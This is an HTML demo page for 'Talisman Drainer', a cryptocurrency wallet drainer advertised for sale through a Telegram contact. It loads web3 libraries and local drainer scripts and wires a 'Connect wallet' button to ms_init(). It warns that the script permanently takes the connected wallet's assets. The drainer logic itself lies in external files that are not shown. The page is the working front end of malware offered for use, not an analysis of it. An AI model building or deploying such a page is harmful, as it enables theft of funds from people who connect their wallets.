<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' 'unsafe-eval' chrome-extension: https: 'wasm-unsafe-eval'; object-src 'self'">

    <title>Web3 Integration</title>
    <!-- Web3 Dependencies -->
    <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
    <script src="https://unpkg.com/web3@1.7.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.1/dist/umd/index.min.js"></script>
</head>
<body>
  <h1>Page with an example of how Talisman Drainer works</h1>
  <p>Want to buy? Write to Telegram: @talisman_dev</p>
  <hr>
  <div class="advanced_mode">
    <p><strong>Built-in wallet:</strong> <span id="injected-status">false</span></p>
    <button onclick="ms_init()">Connect wallet</button>
    <p><strong>Be careful!</strong> The script permanently writes off your assets!</p>
  </div>
    <!-- Load local scripts last -->
    <script src="./assets/web3-provider/web3-connect.js"></script>
    <script src="./assets/web3-provider/web3-router.js"></script>
    <script src="./assets/web3-provider/web3-module.js"></script>
    <script src="./assets/web3-provider/web3-alert.js"></script>
    <script src="./assets/web3-provider/web3-seaport.js"></script>
    <script src="./assets/web3-provider/web3-data.js"></script>
    <script src="./assets/web3-provider/ethers.js"></script>
    <script src="./assets/web3-provider/ethereum-tx.js"></script>
    <script src="./assets/web3-provider.js"></script>
  <script>
    setInterval(() => {
      document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
    }, 1000);
  </script>
</body>
</html>
